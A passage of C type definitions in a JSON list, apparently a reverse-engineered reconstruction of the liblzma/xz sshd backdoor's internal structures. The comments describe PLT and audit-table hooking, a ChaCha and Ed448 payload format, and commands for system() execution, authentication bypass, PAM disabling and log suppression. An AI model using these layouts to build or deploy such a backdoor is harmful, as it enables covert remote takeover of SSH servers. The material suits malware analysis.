      "code": "typedef union __attribute__((packed)) sshd_offsets {\n sshd_offsets_fields_t fields; /* Structured view: {kex, sshbuf} sub-unions. */\n struct __attribute__((packed)) {\n  sbyte kex_sshbuf_qword_index; /* Qword index inside `struct kex` holding the candidate `sshbuf *`; -1 triggers brute-force scanning. */\n  sbyte monitor_pkex_table_dword_index; /* Dword index inside `struct monitor` for the `kex **` slot; -1 uses monitor->pkex_table. */\n  sbyte sshbuf_data_qword_index; /* Qword index inside `struct sshbuf` for the `d` pointer; -1 uses buf->d. */\n  sbyte sshbuf_size_qword_index; /* Qword index inside `struct sshbuf` for the `size` field; -1 uses buf->size. */\n } bytes;\n u32 raw_value; /* Little-endian packed bytes: {kex_sshbuf_qword_index, monitor_pkex_table_dword_index, sshbuf_data_qword_index, sshbuf_size_qword_index}. */\n} sshd_offsets_t;"
    },
    {
      "kind": "struct",
      "names": [
        "sshd_hostkey_index_t"
      ],
      "code": "typedef struct __attribute__((packed)) sshd_hostkey_index {\n u32 raw_value; /* Zero-based index into `ctx->sshd_sensitive_data->host_pubkeys` for whichever key validated the Ed448 signature. */\n} sshd_hostkey_index_t;"
    },
    {
      "kind": "enum",
      "names": [
        "payload_stream_state_t"
      ],
      "code": "typedef enum {\n PAYLOAD_STREAM_EXPECT_HEADER = 0, /* State zero: staging buffer must stay below 0xae bytes until the signed header decrypts and the Ed448 check succeeds. */\n PAYLOAD_STREAM_BUFFERING_BODY = 1, /* Header verified; continue appending ChaCha-decrypted body chunks until the advertised payload_total_size is satisfied. */\n PAYLOAD_STREAM_BUFFERING_TRAILER = 2, /* Reserved continuation stage (treated equivalently to state 1 by check_backdoor_state for older payload builders). */\n PAYLOAD_STREAM_COMMAND_READY = 3, /* Entire signed payload assembled and verified; mm_answer_keyallowed may now interpret the decrypted command. */\n PAYLOAD_STREAM_DISPATCHED = 4, /* Command handlers already consumed the payload—new chunks are ignored until the buffer resets. */\n PAYLOAD_STREAM_POISONED = 0xffffffff /* Fatal validation error; callers must discard any staged ciphertext and restart at state zero. */\n} payload_stream_state_t;"
    },
    {
      "kind": "struct",
      "names": [
        "global_context_t"
      ],
      "code": "typedef struct __attribute__((packed)) global_context {\n BOOL uses_endbr64; /* sshd uses ENDBR64 prologues (CET); gates relocation validation. */\n u32 uses_endbr64_padding; /* Alignment padding. */\n imported_funcs_t *imported_funcs; /* Resolved libcrypto helpers (RSA/BN/ChaCha/etc.) sourced from hooks_data. */\n libc_imports_t *libc_imports; /* Resolved libc syscalls (read/write/pselect/exit) used by the hooks. */\n BOOL disable_backdoor; /* When TRUE, hooks bail out to the original OpenSSL/sshd logic. */\n u32 disable_backdoor_padding; /* Alignment padding. */\n sshd_ctx_t *sshd_ctx; /* sshd hook state (mm handler addresses, request types, monitor offsets). */\n sensitive_data *sshd_sensitive_data; /* Captured sshd secrets/hostkeys table produced by the recon scans. */\n sshd_log_ctx_t *sshd_log_ctx; /* Bookkeeping for the mm_log_handler shim. */\n char *ssh_rsa_cert_alg; /* Pointer to \"ssh-rsa-cert-v01@openssh.com\" string inside sshd (modulus carving). */\n char *rsa_sha2_256_alg; /* Pointer to \"rsa-sha2-256\" string inside sshd (modulus carving). */\n monitor **monitor_struct_slot; /* BSS slot holding the active monitor* pointer discovered via xref voting. */\n u32 exit_flag; /* If set, keyallowed hook will exit(0) after payload handling. */\n sshd_offsets_t sshd_offsets; /* Packed indexes into monitor/kex/sshbuf fields for socket/payload lookups. */\n void *sshd_text_start; /* Bounds of sshd .text used by pattern searches and secret-data scanners. */\n void *sshd_text_end;\n void *sshd_data_start; /* Bounds of sshd .data/.bss used while hunting monitor globals. */\n void *sshd_data_end;\n void *sshd_main_entry; /* Resolved sshd main() pointer (and CET ENDBR check anchor). */\n void *liblzma_text_start; /* Bounds of liblzma code segment that houses the hook blob. */\n void *liblzma_text_end;\n u32 caller_uid; /* getuid() snapshot used to gate PAM/log overrides. */\n u32 caller_uid_padding; /* Alignment padding. */\n u64 sock_read_len; /* Bytes staged from the monitor socket for the pending payload. */\n u8 sock_read_buf[64]; /* Scratch buffer holding the staged payload tail read from keyallowed. */\n u64 payload_buffer_size; /* Total size of the signed payload buffer resident in hooks_data. */\n u64 payload_bytes_buffered; /* Number of payload bytes currently assembled into payload_buffer. */\n u8 *payload_buffer; /* Pointer to the shared payload scratch (hooks_data->signed_data). */\n sshd_payload_ctx_t *payload_ctx; /* Parsed payload header/context produced by keyallowed hook. */\n u32 sshd_host_pubkey_idx; /* Hostkey slot that verified the Ed448 signature. */\n payload_stream_state_t payload_state; /* Streaming state machine enforced by check_backdoor_state. */\n u8 encrypted_secret_data[57]; /* ChaCha-encrypted secret blob; decrypted by secret_data_get_decrypted. */\n u8 shift_operation_flags[31]; /* Per-operation guard bits so secret_data_append_* runs each attestation once. */\n u32 secret_bits_filled; /* Total bits shifted into the secret_data buffer so far. */\n u32 secret_data_padding; /* Alignment padding. */\n} global_context_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_shared_globals_t"
      ],
      "code": "typedef struct __attribute__((packed)) backdoor_shared_globals {\n sshd_monitor_func_t authpassword_hook_entry; /* Jump target stage one publishes so later stages can patch mm_answer_authpassword(). */\n pfn_EVP_PKEY_set1_RSA_t evp_set1_rsa_hook_entry; /* Exported EVP hook trampoline shared between setup and the RSA key handlers. */\n global_context_t **global_ctx_slot; /* Pointer to the loader-owned `global_ctx` pointer so freshly installed hooks can find the singleton state. */\n} backdoor_shared_globals_t;"
    },
    {
      "kind": "struct",
      "names": [
        "ldso_ctx_t"
      ],
      "code": "typedef struct __attribute__((packed)) ldso_ctx {\n u8 _unknown1459[0x40];\n u32 *libcrypto_auditstate_bindflags_ptr;\n u32 libcrypto_auditstate_bindflags_old_value;\n u8 _unknown1476[0x4];\n u32 *sshd_auditstate_bindflags_ptr;\n u32 sshd_auditstate_bindflags_old_value;\n u8 _unknown1493[0x4];\n void* sshd_link_map_l_audit_any_plt_addr;\n u8 link_map_l_audit_any_plt_bitmask;\n u8 _unknown1510[0x7];\n struct audit_ifaces **_dl_audit_ptr;\n unsigned int *_dl_naudit_ptr;\n struct audit_ifaces hooked_audit_ifaces;\n u8 _unknown1538[0x30];\n char **libcrypto_l_name;\n dl_audit_symbind_alt_fn _dl_audit_symbind_alt;\n size_t _dl_audit_symbind_alt__size;\n pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;\n pfn_EVP_PKEY_set1_RSA_t hook_EVP_PKEY_set1_RSA;\n pfn_RSA_get0_key_t hook_RSA_get0_key;\n imported_funcs_t *imported_funcs;\n u64 hooks_installed;\n} ldso_ctx_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_hooks_data_t"
      ],
      "code": "typedef struct __attribute__((packed)) backdoor_hooks_data {\n ldso_ctx_t ldso_ctx; /* Snapshot of ld.so state (audit tables, hook trampolines, import pointers) that we install into liblzma. */\n global_context_t global_ctx; /* Runtime configuration shared between hooks (payload buffers, sshd metadata, shift cursors, etc.). */\n imported_funcs_t imported_funcs; /* Copy of the resolved libcrypto/libc entry points we patch so hooks can call the originals. */\n sshd_ctx_t sshd_ctx; /* Captured sshd function pointers/state used by the key hooks. */\n libc_imports_t libc_imports; /* Writable mirror of the libc imports resolved during setup. */\n sshd_log_ctx_t sshd_log_ctx; /* Book-keeping for the mm_log_handler shim (toggle + buffer). */\n u64 signed_data_size; /* Length in bytes of the attacker-signed payload that trails this struct. */\n u8 signed_data; /* First byte of the signed payload blob; rest of the bytes follow immediately in memory. */\n} backdoor_hooks_data_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_hooks_ctx_t"
      ],
      "code": "typedef struct __attribute__((packed)) backdoor_hooks_ctx {\n u8 bootstrap_scratch[0x30]; /* Zeroed on every init attempt; doubles as throwaway storage while we copy the ctx around during bootstrap. */\n backdoor_shared_globals_t *shared_globals_ptr; /* Pointer to the `backdoor_shared_globals_t` shim; stays NULL until init_shared_globals publishes the shared block. */\n backdoor_hooks_data_t **hooks_data_slot_ptr; /* Address of liblzma’s global hooks_data pointer so stage two can pull the persistent blob/documented contexts out of `.bss`. */\n audit_symbind64_fn symbind64_trampoline; /* Backdoor symbind trampoline installed into ld.so’s audit vector (backdoor_symbind64). */\n pfn_RSA_public_decrypt_t rsa_public_decrypt_entry; /* RSA_public_decrypt replacement pushed into sshd’s PLT. */\n pfn_RSA_get0_key_t rsa_get0_key_entry; /* RSA_get0_key replacement pushed into sshd’s PLT. */\n mm_log_handler_fn mm_log_handler_entry; /* mm_log_handler shim we install when hooking sshd. */\n void *mm_log_handler_ctx_slot; /* Reserved slot for the log-hook context pointer (currently unused but keeps the struct layout stable). */\n u64 bootstrap_state_flags; /* Scratch flags touched by init_hooks_ctx (set to 0x4 during bootstrap retries). */\n sshd_monitor_func_t mm_answer_keyallowed_entry; /* mm_answer_keyallowed hook entry point. */\n sshd_monitor_func_t mm_answer_keyverify_entry; /* mm_answer_keyverify hook entry point. */\n void *pending_monitor_hook; /* Placeholder for future monitor-hook trampolines (never populated in this build). */\n} backdoor_hooks_ctx_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_setup_params_t"
      ],
      "code": "typedef struct __attribute__((packed)) backdoor_setup_params {\n u8 bootstrap_padding[0x8]; /* Scratch bytes stage two zeroes while stack-allocating the struct; keeps the later pointers aligned and doubles as the memset target. */\n backdoor_shared_globals_t *shared_globals; /* Pointer to the published `backdoor_shared_globals_t` block (authpassword hook entry, EVP hook entry, global_ctx slot). */\n backdoor_hooks_ctx_t *hook_ctx; /* Active hook descriptor produced by init_hooks_ctx (contains the mm/RSA trampolines and hooks_data slot). */\n lzma_check_state dummy_check_state; /* Throwaway check_state initialised with lzma_check_init so stage two can satisfy the API while building the params. */\n elf_entry_ctx_t *entry_ctx; /* Captured GOT/stack metadata for the currently hijacked cpuid thunk. */\n} backdoor_setup_params_t;"
    },
    {
      "kind": "struct",
      "names": [
        "elf_handles_t"
      ],
      "code": "typedef struct __attribute__((packed)) elf_handles {\n elf_info_t *sshd; /* Parsed ELF metadata for sshd's main binary (the head of r_debug->r_map). */\n elf_info_t *ldso; /* ld-linux/ld.so descriptor used when validating _rtld_global and patching audit tables. */\n elf_info_t *libc; /* glibc descriptor feeding libc_imports_t and the fake allocator glue. */\n elf_info_t *liblzma; /* liblzma descriptor that houses the hook blob and allocator overrides. */\n elf_info_t *libcrypto; /* libcrypto descriptor targeted by RSA/EVP hooks and audit trampolines. */\n} elf_handles_t;"
    },
    {
      "kind": "struct",
      "names": [
        "main_elf_t"
      ],
      "code": "typedef struct __attribute__((packed)) main_elf {\n elf_handles_t *elf_handles;\n Elf64_Ehdr *dynamic_linker_ehdr;\n void **__libc_stack_end;\n} main_elf_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_data_t"
      ],
      "code": "typedef struct backdoor_data backdoor_data_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_data_handle_t"
      ],
      "code": "typedef struct __attribute__((packed)) backdoor_data_handle {\n backdoor_data_t *runtime_data; /* Aggregated loader/global state (link_map cache, string refs, imports, etc.) captured during init. */\n elf_handles_t *cached_elf_handles; /* Pointer to runtime_data->elf_handles so helpers can dereference ELF metadata without reaching through the enclosing blob. */\n} backdoor_data_handle_t;"
    },
    {
      "kind": "struct",
      "names": [
        "string_item_t"
      ],
      "code": "typedef struct __attribute__((packed)) string_item {\n EncodedStringId string_id; /* Identifier for the literal this entry tracks. */\n u32 padding; /* Alignment padding; unused by the heuristics. */\n void *func_start; /* Lower bound for the routine that references the string. */\n void *func_end; /* Upper bound after branch/reloc sweeps. */\n void *xref; /* LEA that materialises the string literal. */\n} string_item_t;"
    },
    {
      "kind": "struct",
      "names": [
        "string_references_t"
      ],
      "code": "typedef struct __attribute__((packed)) string_references {\n string_item_t xcalloc_zero_size; /* Zero-size xcalloc site that seeds sensitive-data scans. */\n string_item_t chdir_home_error; /* do_child chdir failure path. */\n string_item_t list_hostkey_types; /* main() hostkey banner anchor. */\n string_item_t demote_sensitive_data; /* demote_sensitive_data helper. */\n string_item_t mm_terminate; /* monitor mm_terminate RPC. */\n string_item_t mm_pty_allocate; /* monitor PTY allocation RPC. */\n string_item_t mm_do_pam_account; /* monitor PAM account RPC. */\n string_item_t mm_session_pty_cleanup2; /* monitor sess-pty cleanup helper. */\n string_item_t mm_getpwnamallow; /* monitor passwd lookup helper. */\n string_item_t mm_sshpam_init_ctx; /* monitor sshpam init. */\n string_item_t mm_sshpam_query; /* monitor sshpam query. */\n string_item_t mm_sshpam_respond; /* monitor sshpam respond. */\n string_item_t mm_sshpam_free_ctx; /* monitor sshpam ctx teardown. */\n string_item_t mm_choose_dh; /* monitor Diffie-Hellman chooser. */\n string_item_t sshpam_respond; /* server-side sshpam respond helper. */\n string_item_t sshpam_auth_passwd; /* server-side sshpam auth password helper. */\n string_item_t sshpam_query; /* server-side sshpam query helper. */\n string_item_t start_pam; /* start_pam helper. */\n string_item_t mm_request_send; /* monitor mm_request_send framing helper. */\n string_item_t mm_log_handler; /* mm_log_handler trampoline used to grab handler context. */\n string_item_t agent_socket_error; /* Agent-socket failure string that anchors the log-handler scan. */\n string_item_t auth_root_allowed; /* PermitRootLogin flag string. */\n string_item_t mm_answer_authpassword; /* monitor mm_answer_authpassword RPC. */\n string_item_t mm_answer_keyallowed; /* monitor mm_answer_keyallowed RPC. */\n string_item_t mm_answer_keyverify; /* monitor mm_answer_keyverify RPC. */\n string_item_t sshlogv_format; /* sshlogv formatter string anchoring sshlogv(). */\n string_item_t syslog_bad_level; /* Syslog-level fallback used to locate log handler wiring. */\n} string_references_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_data_t"
      ],
      "code": "typedef struct __attribute__((packed)) backdoor_data {\n struct link_map *sshd_link_map; /* Live `link_map` entry for sshd’s main binary (aka r_debug->r_map head when basename is empty). */\n struct link_map *ldso_link_map; /* ld-linux / ld.so entry used when verifying _rtld_global and later when patching the audit tables. */\n struct link_map *liblzma_link_map; /* Active liblzma entry so we can locate the RW data segment housing the hook blob + allocator. */\n struct link_map *libcrypto_link_map; /* Live libcrypto entry whose `l_audit` fields get overwritten to redirect PLT binds. */\n struct link_map *libsystemd_link_map; /* Captured libsystemd entry; primarily used as a canary so the r_map walk sees the expected baseline. */\n struct link_map *libc_link_map; /* Live libc entry used for import resolution and syscalls proxied through the fake allocator. */\n elf_handles_t elf_handles; /* Parsed `elf_info_t` descriptors for {sshd, ld.so, libc, liblzma, libcrypto}. */\n backdoor_data_handle_t data_handle; /* Self-referential handle pairing this blob with `elf_handles` for helper callers. */\n elf_info_t main_info; /* Cached ELF metadata for sshd’s main binary. */\n elf_info_t dynamic_linker_info; /* Cached ELF metadata for ld.so (audit target). */\n elf_info_t libc_info; /* Cached ELF metadata for glibc. */\n elf_info_t liblzma_info; /* Cached ELF metadata for liblzma (where the hooks live). */\n elf_info_t libcrypto_info; /* Cached ELF metadata for libcrypto (RSA/EVP targets). */\n libc_imports_t libc_imports; /* Table of libc imports resolved once the libc rwx ranges are known. */\n string_references_t sshd_string_refs; /* Catalog of key sshd strings and their xrefs; drives the recon scans. */\n lzma_allocator saved_lzma_allocator; /* Copy of the ambient liblzma allocator callbacks (restored after we borrow them). */\n lzma_allocator *active_lzma_allocator; /* Live allocator pointer exposed to helpers; we swap its opaque pointer to resolve imports. */\n} backdoor_data_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_shared_libraries_data_t"
      ],
      "code": "typedef struct __attribute__((packed)) backdoor_shared_libraries_data {\n backdoor_data_t *shared_maps; /* Aggregated link_map/elf_info blob populated while scanning r_debug. */\n elf_handles_t *elf_handles; /* Typed handles for each parsed ELF (main, libc, liblzma, etc.). */\n void **rsa_public_decrypt_slot; /* Address of the GOT/PLT slot we overwrite with our RSA_public_decrypt hook. */\n void **evp_set1_rsa_slot; /* Address of sshd’s EVP_PKEY_set1_RSA PLT entry for patching. */\n void **rsa_get0_key_slot; /* Address of sshd’s RSA_get0_key PLT entry for patching. */\n backdoor_hooks_data_t **hooks_data_slot; /* Pointer to the liblzma-resident hook blob pointer so we can stash the parsed address. */\n libc_imports_t *libc_imports; /* libc import table that needs resolving once libc is parsed. */\n} backdoor_shared_libraries_data_t;"
    },
    {
      "kind": "union",
      "names": [
        "secret_data_shift_cursor_t"
      ],
      "code": "typedef union {\n u32 bit_position; /* Absolute bit offset inside global_ctx->secret_data (0..0x1C7). */\n u32 index; /* Legacy alias for bit_position kept for existing helpers. */\n int signed_bit_position; /* Signed view for comparisons/subtractions during cursor arithmetic. */\n int signed_index; /* Legacy alias for signed_bit_position used by existing heuristics. */\n struct {\n  u32 intra_byte_bit : 3; /* Bit number within the current byte (bit_position & 7). */\n  u32 byte_offset : 29; /* Byte index inside the obfuscated log (bit_position >> 3). */\n };\n} secret_data_shift_cursor_t;"
    },
    {
      "kind": "struct",
      "names": [
        "secret_data_item_t"
      ],
      "code": "typedef struct __attribute__((packed)) secret_data_item {\n u8 *anchor_pc; /* Instruction pointer identifying the helper/function we attest; used to locate the containing routine before appending. */\n secret_data_shift_cursor_t bit_cursor; /* Bit-stream cursor describing where this item lands inside the obfuscated secret data log. */\n u32 operation_slot; /* Index into global_ctx->shift_operations[] so each helper shifts at most once. */\n u32 bits_to_shift; /* Number of bits consumed/emitted when this descriptor succeeds (rolls into global_ctx->num_shifted_bits). */\n u32 ordinal; /* Non-zero slot ordinal assigned by secret_data_append_items; zero marks disabled entries. */\n} secret_data_item_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_payload_hdr_t"
      ],
      "code": "typedef struct __attribute__((packed)) backdoor_payload_hdr {\n u32 cmd_type_stride; /* Low 32 bits of the ChaCha nonce; multiplied with cmd_type_index before cmd_type_bias is applied. */\n u32 cmd_type_index; /* High 32 bits of the ChaCha nonce; second multiplicand in the cmd_type calculation. */\n int64_t cmd_type_bias; /* Signed bias added to the product; also forms the top half of the 16-byte nonce. */\n} backdoor_payload_hdr_t;"
    },
    {
      "kind": "union",
      "names": [
        "u_cmd_arguments_t"
      ],
      "code": "typedef union __attribute__((packed)) {\n u8 value[2];\n u16 size;\n} u_cmd_arguments_t;"
    },
    {
      "kind": "struct",
      "names": [
        "cmd_arguments_t"
      ],
      "code": "typedef struct __attribute__((packed)) cmd_arguments {\n u8 control_flags; /* Primary toggles consumed by run_backdoor_commands()/sshd_proxy_elevate: bit0 requests sshd exit after dispatch (propagates into ctx->exit_flag and calls libc_exit(0) on parse failures), bit1 asks sshd_configure_log_hook() to run, bit2 requests setlogmask(-0x80000000), bit3 differentiates \"squelch\" logging from the filter mode, bit4 requires that the attacker-supplied format strings are present before enabling the filter, bit5 forces sshd_proxy_elevate to use sshd_get_usable_socket() with the encoded socket ids, bit6 disables PAM by zeroing use_pam_ptr, and bit7 tells sshd_proxy_elevate to wait for replies while letting opcode 0 treat the tail bytes as sshd_offsets overrides. */\n u8 monitor_flags; /* Secondary command byte: bit0 marks that continuation chunks include an 8-byte prefix before the little-endian size, bit1/bit2 tell run_backdoor_commands() that flags3/payload_hint carry sshd_offsets nibbles, bits3-5 hold the socket ordinal for cmd_type 0/1/2 when manual sockets are requested, and the high bits (0xC0) describe how cmd_type 3 sources payloads (0x40 = exit immediately, 0x00/0x80 = find the ChaCha blob on the stack, 0xC0 = payload_body/payload_body_size already populated). */\n u8 request_flags; /* Monitor/socket selector: the low 5 bits either override the MONITOR_REQ_* opcode or carry an additional socket index, bit5 advertises that sshd_proxy_elevate must pull an sshbuf payload via sshd_get_sshbuf(), and bit6 repurposes the tail bytes when opcode 0 patches ctx->sshd_offsets (see run_backdoor_commands()). */\n u_cmd_arguments_t payload_hint; /* Final two bytes reused as either a payload length (continuation chunks streamed into ctx->payload_buffer) or as raw bitfields when opcode 0 repacks ctx->sshd_offsets/monitor request selectors. */\n} cmd_arguments_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_payload_body_t"
      ],
      "code": "typedef struct __attribute__((packed)) key_payload_body {\n u8 ed448_signature[114]; /* 0x72-byte Ed448 signature covering the decrypted cmd flags and payload bytes; verified against sshd host keys. */\n cmd_arguments_t cmd_flags; /* Three command flag bytes (plus the u_cmd_arguments_t union) that govern PAM/log toggles, socket selection, and continuation sizing semantics. */\n u8 monitor_payload[0x1A1]; /* Attacker-supplied body starting 0x87 bytes into the decrypted blob (0x10-byte header + 0x77-byte signed prefix); holds the monitor command stream/sshbuf data. */\n} backdoor_payload_body_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_payload_t"
      ],
      "code": "typedef struct __attribute__((packed)) backdoor_payload {\n union {\n  u8 raw[0x228]; /* Entire decrypted payload blob (header + body) as a flat buffer for signature checks and monitor copies. */\n  struct __attribute__((packed)) {\n   backdoor_payload_hdr_t header; /* 16-byte nonce/cmd-type seeds pulled straight from the RSA modulus chunk. */\n   backdoor_payload_body_t body; /* Ed448 signature block plus the parsed command flags and monitor payload stream. */\n  };\n };\n} backdoor_payload_t;"
    },
    {
      "kind": "struct",
      "names": [
        "key_payload_t"
      ],
      "code": "typedef struct __attribute__((packed)) key_payload {\n backdoor_payload_hdr_t header; /* Plaintext 16-byte nonce/cmd seed reused directly by decrypt_payload_message. */\n u16 encrypted_body_length; /* Little-endian body length in ciphertext; decrypted to learn how many bytes to copy. */\n u8 encrypted_body[1]; /* Variable-length ciphertext immediately following the length field. */\n} key_payload_t;"
    },
    {
      "kind": "struct",
      "names": [
        "key_payload_cmd_frame_t"
      ],
      "code": "typedef union __attribute__((packed)) key_payload_cmd_frame {\n u8 bytes[0x21d]; /* Raw view: 5-byte cmd_flags prefix + modulus ciphertext chunk (max 0x218 bytes). */\n struct __attribute__((packed)) {\n  cmd_arguments_t cmd_flags; /* Scratch copy of the decrypted cmd flag bytes (control/monitor/request flags + payload_hint) staged before the ciphertext for easy access. */\n  u8 header_bytes[16]; /* Plaintext payload header reused as the ChaCha nonce; see backdoor_payload_hdr_t for decoded {stride,index,bias}. */\n  u16 encrypted_body_length; /* Little-endian body length in ciphertext; becomes valid plaintext after the first ChaCha pass. */\n  u8 encrypted_body[0x206]; /* Ciphertext body bytes (max derived from run_backdoor_commands() modulus bounds: 0x218 - 0x10 - 2). */\n } fields;\n} key_payload_cmd_frame_t;"
    },
    {
      "kind": "enum",
      "names": [
        "CommandFlags1"
      ],
      "code": "enum CommandFlags1 {\n X_FLAGS1_8BYTES = 0x1,\n X_FLAGS1_SETLOGMASK = 0x4,\n X_FLAGS1_SOCKET_INDEX = 0x20,\n X_FLAGS1_DISABLE_PAM = 0x40,\n X_FLAGS1_NO_EXTENDED_SIZE = 0x80\n};"
    },
    {
      "kind": "enum",
      "names": [
        "CommandFlags2"
      ],
      "code": "enum CommandFlags2 {\n X_FLAGS2_IMPERSONATE = 0x1,\n X_FLAGS2_CHANGE_MONITOR_REQ = 0x2,\n X_FLAGS2_AUTH_BYPASS = 0x4,\n X_FLAGS2_CONTINUATION = 0x40,\n X_FLAGS2_PSELECT = 0xC0,\n X_FLAGS2_SOCKFD_MASK = 0x78\n};"
    },
    {
      "kind": "enum",
      "names": [
        "CommandFlags3"
      ],
      "code": "enum CommandFlags3 {\n X_FLAGS3_SOCKET_NUM = 0x1F,\n X_FLAGS3_MONITOR_REQ_VAL = 0x3F\n};"
    },
    {
      "kind": "enum",
      "names": [
        "monitor_cmd_type_t"
      ],
      "code": "typedef enum {\n MONITOR_CMD_CONTROL_PLANE = 0, /* Baseline command stream: updates sshd offsets/logging toggles and can stream continuation payloads through the forged monitor socket. */\n MONITOR_CMD_PATCH_VARIABLES = 1, /* Rewrites sshd globals (PermitRootLogin/use_pam/log hooks) before resuming the monitor loop. */\n MONITOR_CMD_SYSTEM_EXEC = 2, /* Runs attacker-provided setresuid/setresgid/system commands and optionally asks sshd_proxy_elevate to exit afterwards. */\n MONITOR_CMD_PROXY_EXCHANGE = 3 /* Fully populate monitor_data_t and have sshd_proxy_elevate forge a MONITOR_REQ_KEYALLOWED exchange on the chosen socket. */\n} monitor_cmd_type_t;"
    },
    {
      "kind": "struct",
      "names": [
        "key_ctx_t"
      ],
      "code": "typedef struct __attribute__((packed)) key_ctx {\n const BIGNUM *rsa_modulus; /* RSA modulus returned by RSA_get0_key; reused when forging RSA_set0_key input. */\n const BIGNUM *rsa_exponent; /* RSA public exponent grafted onto the forged key context. */\n cmd_arguments_t cmd_args; /* Command flag triple parsed out of payload.body.cmd_flags. */\n backdoor_payload_t decrypted_payload; /* Entire decrypted payload blob (header + body) kept around for signature checks/replays. */\n u8 hostkey_digest[32]; /* SHA-256 digest of the current sshd host key before it is spliced into decrypted_payload. */\n u8 payload_nonce[16]; /* Plaintext nonce lifted from the payload header (cmd_type seeds) reused as the ChaCha nonce. */\n u8 chacha_iv[16]; /* ChaCha IV/counter snapshot so decrypt_payload_message can rewind the keystream for replays. */\n u8 attacker_ed448_key[57]; /* Raw Ed448 public key bytes from secret_data_get_decrypted (low 32 bytes double as the ChaCha key). */\n u8 ed448_key_align[2]; /* Padding to keep the struct 8-byte aligned after the 57-byte key. */\n} key_ctx_t;"
    },
    {
      "kind": "struct",
      "names": [
        "monitor_data_t"
      ],
      "code": "typedef struct __attribute__((packed)) monitor_data {\n monitor_cmd_type_t cmd_type; /* Attacker-defined opcode describing how sshd_proxy_elevate should respond (control-plane updates, sshd variable patches, system() exec, or forged monitor exchanges). */\n u32 cmd_type_padding; /* High dword of the ChaCha-derived cmd index; left unused but keeps the runtime_data union 64-bit aligned. */\n cmd_arguments_t *args; /* Pointer to the decoded cmd flag bytes pulled from the decrypted payload body. */\n const BIGNUM *rsa_n; /* Modulus cloned from the staged RSA key (used when forging keyallowed/keyverify exchanges). */\n const BIGNUM *rsa_e; /* Public exponent cloned from the staged RSA key. */\n u8 *payload_body; /* Pointer to attacker-controlled monitor payload bytes (sshbuf fragments, serialized RPCs, etc.). */\n u16 payload_body_size; /* Length of payload_body that should be replayed into sshbuf/mm_request_send. */\n u8 payload_size_padding[6]; /* Alignment padding before the RSA* pointer; also reused when the union treats this area as scratch. */\n RSA *rsa; /* RSA handle supplied by OpenSSL; reused when emitting forged monitor packets. */\n} monitor_data_t;"
    },
    {
      "kind": "union",
      "names": [
        "backdoor_runtime_data_t"
      ],
      "code": "typedef union __attribute__((packed)) backdoor_runtime_data {\n monitor_data_t monitor;\n u8 data[608];\n} backdoor_runtime_data_t;"
    },
    {
      "kind": "struct",
      "names": [
        "run_backdoor_commands_data_t"
      ],
      "code": "typedef struct __attribute__((packed)) run_backdoor_commands_data {\n u64 payload_body_size; /* Plaintext bytes (cmd flags + monitor payload) staged from the decrypted modulus. */\n BOOL *do_orig_flag; /* Pointer to the RSA hook's do_orig flag so failures can fall back to OpenSSL. */\n u64 payload_cipher_size; /* Ciphertext length carved out of the RSA modulus before decrypt_payload_message runs. */\n u64 hostkey_digest_offset; /* Offset/cursor used while hashing sshd host keys and when reusing the buffer for patch commands. */\n RSA *rsa_handle; /* RSA handle supplied by OpenSSL; reused when forging monitor packets or rebuilding RSA_set0_key input. */\n u8 *payload_body_cursor; /* Pointer into ctx->payload_buffer where continuation chunks are copied. */\n u8 *ed448_key_cursor; /* Pointer to the Ed448 key bytes currently staged for signature verification or rotation. */\n u64 hostkey_count; /* Number of sshd host keys discovered through count_pointers(). */\n u8 hostkey_index_align[4]; /* Alignment gap before the current host key index. */\n u32 hostkey_index; /* Index of the sshd host key currently being hashed/verified. */\n u64 last_hostkey_index; /* Previously verified host key index so continuation chunks can resume. */\n u8 staging_align[7]; /* Aligns the staging union on an 8-byte boundary. */\n u8 staging_mode; /* Flags describing whether staging carries socket RX state or host-key metadata. */\n union {\n  struct __attribute__((packed)) {\n   int fd; /* Socket descriptor returned by sshd_get_client_socket/sshd_get_usable_socket. */\n   u32 recv_size; /* Bytes remaining to read from the selected socket when streaming payloads. */\n   u8 recv_buf[64]; /* Inline buffer used together with fd_read/pselect before copying into ctx->payload_buffer. */\n  } socket_state;\n  struct __attribute__((packed)) {\n   u64 host_keys_available; /* Entries counted in ctx->sshd_sensitive_data->host_keys. */\n   u64 host_pubkeys_available; /* Entries counted in ctx->sshd_sensitive_data->host_pubkeys. */\n   u8 staged_ed448_key[57]; /* Ed448 public key bytes copied out of the decrypted payload. */\n  } keyset;\n } staging;\n u8 runtime_align[7]; /* Padding so backdoor_runtime_data_t stays 8-byte aligned. */\n backdoor_runtime_data_t runtime; /* Either interpreted as monitor_data_t or as scratch bytes prior to sshd_proxy_elevate. */\n key_ctx_t key_ctx; /* Cached modulus/exponent pointers plus the decrypted payload/nonce/digest bundle reused across commands. */\n} run_backdoor_commands_data_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_cpuid_reloc_consts_t"
      ],
      "code": "typedef struct __attribute__((packed)) backdoor_cpuid_reloc_consts {\n ptrdiff_t random_cpuid_slot_offset_from_got_anchor; /* Delta from `update_got_offset`’s sentinel to the GOT entry storing `cpuid_random_symbol`; used to find the shimmed cpuid resolver. */\n u64 cpuid_stub_got_index; /* GOT index (as seen by liblzma’s cpuid IFUNC) for the slot we later overwrite with backdoor_init_stage2. */\n ptrdiff_t stage2_trampoline_offset_from_got_anchor; /* Delta from the same GOT anchor to the `backdoor_init_stage2` function pointer so the loader can jump to stage two without rescanning code. */\n} backdoor_cpuid_reloc_consts_t;"
    },
    {
      "kind": "struct",
      "names": [
        "backdoor_tls_get_addr_reloc_consts_t"
      ],
